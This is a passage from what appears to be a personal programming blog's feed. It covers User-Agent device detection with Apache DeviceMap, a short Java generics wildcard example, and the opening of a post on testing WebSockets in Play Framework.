    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"model"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"SGH-i780"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayWidth"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"320"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayHeight"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"320"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"mobile_browser"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Microsoft Mobile Explorer"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"mobile_browser_version"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"7.7"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"device_os"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Windows Mobile OS"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"sholest"&lt;/span&gt; &lt;span class="na"&gt;parentId=&lt;/span&gt;&lt;span class="s"&gt;"genericMotorola"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"model"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"XT701"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"marketing_name"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Sholes Tablet"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayWidth"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"480"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_getelementbyid"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_inner_html"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_manipulate_dom"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_manipulate_css"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_events"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_event_listener"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"image_inlining"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"from"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"open_db_modified"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;device&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"bravo"&lt;/span&gt; &lt;span class="na"&gt;parentId=&lt;/span&gt;&lt;span class="s"&gt;"genericHTC"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"model"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"A8183"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"marketing_name"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Bravo"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"displayWidth"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"480"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="c"&gt;&amp;lt;!-- ... --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_manipulate_css"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_events"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"ajax_support_event_listener"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"image_inlining"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;property&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"from"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"open_db_modified"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/device&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id="apache-devicemap"&gt;Apache DeviceMap&lt;/h1&gt;

&lt;p&gt;While DDR exposes you an almost exhaustive set of device vendors, models, and
attributes, it does not provide you a search mechanism in this swamp. &lt;a href="http://devicemap.apache.org/"&gt;Apache
DeviceMap&lt;/a&gt; (which is graduating from incubation
as of this writing) is a project that fills this gap. DeviceMap basically
ships two fundamental Maven artifacts: an OpenDDR clone (&lt;code&gt;devicemap-data&lt;/code&gt;) and
a driver (&lt;code&gt;devicemap-client&lt;/code&gt;) available for Visual Basic, C# and Java
programming languages.&lt;/p&gt;

&lt;p&gt;Usage of Apache DeviceMap is pretty straigt forward. You first include
necessary set of dependencies in your POM file:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-xml"&gt;&lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.devicemap&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;devicemap-data&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.0.2-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.devicemap&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;devicemap-client&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.1.0-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And then enjoy the API exposed by the driver:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.apache.devicemap.DeviceMapClient&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;org.apache.devicemap.loader.LoaderOption&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// Create a DeviceMapClient instance.&lt;/span&gt;
&lt;span class="n"&gt;DeviceMapClient&lt;/span&gt; &lt;span class="n"&gt;deviceMapClient&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;DeviceMapClient&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;deviceMapClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;initDeviceData&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LoaderOption&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;JAR&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Try to classify a sample User-Agent parameter using the DeviceMapClient.&lt;/span&gt;
&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;desc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
              &lt;span class="s"&gt;"AppleWebKit/537.36 (KHTML, like Gecko) "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
              &lt;span class="s"&gt;"Chrome/38.0.2125.104 Safari/537.36"&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;deviceMapClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;classify&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;desc&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Dump found attributes.&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attrs&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Entry&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;attr&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;entrySet&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
        &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;format&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"%s = %s\n"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getKey&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;attr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getValue&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the following you can find the output of the above snippet:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;displayHeight = 600
ajax_support_inner_html = true
mobile_browser_version = -
is_tablet = false
ajax_support_getelementbyid = true
ajax_support_javascript = true
ajax_manipulate_dom = true
ajax_manipulate_css = true
vendor = -
model = -
id = desktopDevice
mobile_browser = -
is_bot = false
nokia_edition = 0
is_wireless_device = false
ajax_support_event_listener = true
device_os = -
inputDevices = -
nokia_series = 0
ajax_support_events = true
xhtml_format_as_css_property = false
displayWidth = 800
marketing_name = -
image_inlining = false
device_os_version = -
xhtml_format_as_attribute = false
is_desktop = true
dual_orientation = false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Per see, the output is not much detailed as the one we got from 51degrees.
Almost all of the crucial data is missing and there are some mistakes in
certain entries like display width and height. That being said, it got three
important bits right: &lt;code&gt;is_desktop&lt;/code&gt;, &lt;code&gt;is_bot&lt;/code&gt;, and &lt;code&gt;is_tablet&lt;/code&gt;. Note that there
does not exist much of a mechanism to verify the correctness of the attributes
returned by the employed engine. That is, the nature of the problem also
implies the absance of a verification mechanism.&lt;/p&gt;

&lt;h1 id="the-grand-decision"&gt;The Grand Decision&lt;/h1&gt;

&lt;p&gt;If you had a chance to check out the website of the commercial DDR and
User-Agent detection solutions, you should have noticed the giant IT leaders
(Google, Facebook, PayPal, etc.) in their customers list. Hence, it was a
little bit tempting to go with a commercial solution. That being said, I also
wanted to evaluate the performance of the Apache DeviceMap. For that purpose,
I collected a couple of months worth visitor data at work and tried to resolve
User-Agent headers. The results were very promising and Apache DeviceMap
succeeded to resolve almost 90% of all the collected User-Agent strings. That
beign said, resolving a User-Agent – that is, matching the given User-Agent
against DDR and returning a set of attributes – does not imply the
correctness of the returned attributes. Nevertheless, I repeated the same
experiment with almost two dozens of different devices at work and it
succeeded in almost everyone.&lt;/p&gt;

&lt;p&gt;Since the project that I am working on is still in its early stages and the
initial results are more than satisfactory, we concluded to go with Apache
DeviceMap. Further, we managed to increase its coverage up to 99% by
introducing some entries manually to do the database. Indeed, we
&lt;a href="https://issues.apache.org/jira/browse/DMAP-104?jql=reporter%20in%20(vy)"&gt;reported&lt;/a&gt;
a majority of those enhancements back to the Apache DeviceMap project.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2014-09-08://blog/post/2014/09/08/wildcards-in-java-generics/</id>
    <title type="html">Wildcards in Java Generics</title>
    <published>2014-09-08T16:42:00Z</published>
    <updated>2014-09-08T16:42:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2014/09/08/wildcards-in-java-generics/"/>
    <content type="html">
&lt;p&gt;I always had a hard time with understanding wildcarded generics in Java, as in
&lt;code&gt;&amp;lt;? extends A&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;? super A&amp;gt;&lt;/code&gt;. While &lt;a href="http://docs.oracle.com/javase/tutorial/extra/generics/morefun.html"&gt;More Fun with
Wildcards&lt;/a&gt;
is a good place for start, you come to a &lt;em&gt;TL;DR&lt;/em&gt; point after some time. Lucky
for me, Heikki (fizzie) Kallasjoki provided me a succinct and complete code
snippet that summarizes the entire issue on &lt;a href="http://freenode.net/"&gt;freenode&lt;/a&gt;
&lt;code&gt;##java&lt;/code&gt; channel.&lt;/p&gt;

&lt;p&gt;First, let’s assume we have two classes &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; as follows.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;A&lt;/span&gt; &lt;span class="o"&gt;{}&lt;/span&gt;

&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;B&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;{}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And here is the code snippet that summarizes the entire issue with wildcarded
generics in Java.&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-java"&gt;&lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;f&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="cm"&gt;/* okay */&lt;/span&gt;
    &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;A&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt; &lt;span class="cm"&gt;/* not okay, l can be of type List&amp;lt;B&amp;gt; */&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;g&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="cm"&gt;/* okay */&lt;/span&gt;
    &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;A&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt; &lt;span class="cm"&gt;/* okay */&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;h&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt; &lt;span class="kd"&gt;super&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;get&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt; &lt;span class="cm"&gt;/* not okay, l can be of type List&amp;lt;Object&amp;gt; */&lt;/span&gt;
    &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;A&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt; &lt;span class="cm"&gt;/* okay */&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;           &lt;span class="cm"&gt;/* okay */&lt;/span&gt;
    &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;           &lt;span class="cm"&gt;/* not okay, List&amp;lt;B&amp;gt; is not of type List&amp;lt;A&amp;gt; */&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;           &lt;span class="cm"&gt;/* not okay, List&amp;lt;B&amp;gt; is not of type List&amp;lt;? super A&amp;gt; */&lt;/span&gt;

    &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;l2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l2&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;          &lt;span class="cm"&gt;/* not okay, List&amp;lt;Object&amp;gt; is not of type List&amp;lt;? extends A&amp;gt; */&lt;/span&gt;
    &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l2&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;          &lt;span class="cm"&gt;/* not okay, List&amp;lt;Object&amp;gt; is not of type List&amp;lt;A&amp;gt; */&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l2&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;          &lt;span class="cm"&gt;/* okay */&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hope that helps.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:vy.github.io,2014-08-07://blog/post/2014/08/07/testing-websockets-in-play/</id>
    <title type="html">Testing WebSockets in Play Framework</title>
    <published>2014-08-07T09:28:00Z</published>
    <updated>2014-08-07T09:28:00Z</updated>
    <link rel="alternate" href="https://vy.github.io//blog/post/2014/08/07/testing-websockets-in-play/"/>
    <content type="html">
&lt;p&gt;In a recent job interview, I was asked to implement a fully fledged (that is,
including unit and integration tests) &lt;a href="http://en.wikipedia.org/wiki/Mancala"&gt;Lubang Menggali
(Mancala)&lt;/a&gt; game, where multiple users are
allowed to play in real-time. I went with &lt;a href="http://www.playframework.com/"&gt;Play
Framework&lt;/a&gt; and used
&lt;a href="http://en.wikipedia.org/wiki/WebSocket"&gt;WebSocket&lt;/a&gt;s to implement the real-time
server-client communication. (You can find the complete sources
&lt;a href="https://github.com/vy/lubang-menggali"&gt;here&lt;/a&gt;.) Play provides necessary leverage
